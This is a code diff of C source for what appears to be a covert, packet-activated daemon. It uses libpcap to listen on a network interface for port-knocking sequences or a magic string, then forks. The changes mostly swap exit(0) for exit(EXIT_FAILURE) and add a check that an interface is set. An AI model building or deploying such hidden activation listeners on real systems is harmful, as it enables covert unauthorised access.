@@ -62,10 +62,17 @@ void create_deamon_process() {
 
     /* If no activation method is supplied, exit */
 #if (!defined(CDR_PORTS) || !defined(CDR_PORTS_SIZE) || !defined(PORT_KNOCK_LIST)) && !defined(MAGIC_PORT_STRING)
-#ifdef DEBUG
-    fprintf(stderr, "No activation method selected\n");
+    #ifdef DEBUG
+        fprintf(stderr, "No activation method selected\n");
+    #endif
+    exit(EXIT_FAILURE);
 #endif
-    exit(0);
+
+#if !defined(CDR_INTERFACE)
+    #ifdef DEBUG
+        fprintf(stderr, "No interface selected\n");
+    #endif
+    exit(EXIT_FAILURE);
 #endif
     
     /* If CDR_PORTS and CDR_PORTS_SIZE are defined, it sets up port knocking */
@@ -81,12 +88,13 @@ void create_deamon_process() {
     filter = set_magic_string_filter();
 #endif
 
+#ifdef CDR_INTERFACE
     if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
 	    #ifdef DEBUG
 	        fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
         #endif
         free(filter);
-	    exit (0);
+	    exit (EXIT_FAILURE);
     }
 
     /* opens the listener */
@@ -98,7 +106,7 @@ void create_deamon_process() {
 	        fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
         #endif
         free(filter);
-	    exit (0);
+	    exit (EXIT_FAILURE);
     }
 
     /* compiles the filter and then sets the filter*/
@@ -107,15 +115,16 @@ void create_deamon_process() {
             capterror(cap,"pcap_compile");
         #endif
         free(filter);
-        exit (0);
+        exit (EXIT_FAILURE);
     }
     if (pcap_setfilter(cap,&cfilter)!=0) {
         #ifdef DEBUG
             capterror(cap,"pcap_setfilter");
             #endif
         free(filter);
-        exit (0);
+        exit (EXIT_FAILURE);
     }
+#endif
 
     /* the filter is set - let's free the base string*/
     free(filter);
@@ -143,7 +152,7 @@ void create_deamon_process() {
             #ifdef DEBUG
             fprintf(stderr,"fork() failed\n");
             #endif
-            exit (0);
+            exit (EXIT_FAILURE);
             break;	/* not reached */
         case 0:
             /* I'm happy */
